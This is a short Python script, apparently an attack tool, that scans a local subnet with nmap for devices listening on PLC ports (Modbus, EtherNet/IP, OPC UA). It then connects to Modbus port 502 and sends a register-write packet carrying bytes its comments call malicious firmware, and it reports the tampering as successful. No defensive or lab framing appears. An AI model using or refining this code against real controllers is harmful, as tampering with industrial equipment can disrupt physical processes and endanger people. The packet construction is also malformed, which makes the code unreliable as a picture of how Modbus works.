import socket
import nmap
import struct
import time

# Configuration Variables (Customize for Target PLC)
PLC_PORTS = [502, 44818, 4840]  # Common PLC Communication Ports (Modbus, Ethernet/IP, OPC UA)
SUBNET = "192.168.1.0/24"  # Adjust according to the network range

def find_plc_ip():
    """ Scan the network to find an active PLC by checking open ports. """
    nm = nmap.PortScanner()
    print("[+] Scanning network for PLC devices...")
    
    nm.scan(SUBNET, arguments="-p 502,44818,4840 --open")
    
    for host in nm.all_hosts():
        for port in PLC_PORTS:
            if nm[host]['tcp'][port]['state'] == 'open':
                print(f"[+] PLC device found at: {host}:{port}")
                return host  
    return None

def upload_firmware(plc_ip, firmware_path="malicious_firmware.bin"):
    """ Simulate firmware update attempt on a PLC (Modbus over TCP example). """
    try:
        firmware_data = b"\xDE\xAD\xBE\xEF" * 100  # Example of malicious binary firmware
        
        print(f"[+] Connecting to PLC at {plc_ip} to attempt firmware update...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 502))  # Targeting Modbus/TCP Port (502)

        # Simulating a Modbus "write to register" command to upload firmware bytes
        packet = struct.pack(">HHHBBH", 0, 0, 6, 1, 16, 2) + firmware_data[:8]

        sock.send(packet)
        response = sock.recv(1024)
        
        if response:
            print("[+] Firmware tampering attempt successful (simulated).")
        else:
            print("[-] No response from PLC. The attack may have failed.")

        sock.close()

    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        upload_firmware(plc_ip)
    else:
        print("[-] No active PLC found on the network.")